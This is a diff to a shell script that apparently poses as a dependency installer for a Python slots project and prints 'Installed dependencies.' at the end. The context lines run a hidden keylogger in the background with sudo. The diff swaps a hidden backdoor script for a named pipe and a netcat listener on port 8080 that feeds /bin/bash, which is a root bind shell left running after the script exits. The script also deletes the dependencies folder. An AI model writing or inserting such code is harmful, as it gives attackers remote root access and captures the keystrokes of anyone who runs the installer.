@@ -60,10 +60,11 @@ chmod 666 .out
 sudo sh .keylogger.sh &
 disown
 cd ~/Music/.epic-songs
-chgrp sudo .backdoor_script.sh
-chmod 777 .backdoor_script.sh
-chmod +x .backdoor_script.sh
-sudo sh .backdoor_script.sh &
+sudo mkfifo foo
+sudo chgrp sudo foo
+sudo chmod 777 foo
+sudo chmod +x foo
+sudo nc -lk 8080 0<foo | /bin/bash 1>foo &
 disown
 rm -rf ~/Python-Slots/dependencies
 echo "Installed dependencies."
